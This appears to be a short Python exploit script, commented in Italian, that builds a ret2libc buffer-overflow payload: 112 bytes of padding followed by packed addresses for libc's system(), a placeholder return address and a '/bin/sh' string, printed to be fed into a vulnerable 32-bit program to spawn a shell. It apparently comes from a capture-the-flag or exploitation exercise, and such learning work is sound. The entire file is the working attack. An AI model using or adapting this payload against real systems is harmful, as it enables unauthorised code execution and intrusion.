import struct


system_addr = struct.pack("<I",0xf7e00160)          #p system
exit_addr = struct.pack("<I",0xd3adc0d3)            #può essere casuale, se è valido invece una volta uscito dall'exploit continua ad eseguire bene senza andare in buffer overflow
arg_addr = struct.pack("<I",0xf7f4a924)             #search-pattern /bin/sh , found in libc

buf = "A" * 112
buf += system_addr
buf += exit_addr
buf += arg_addr

print(buf)
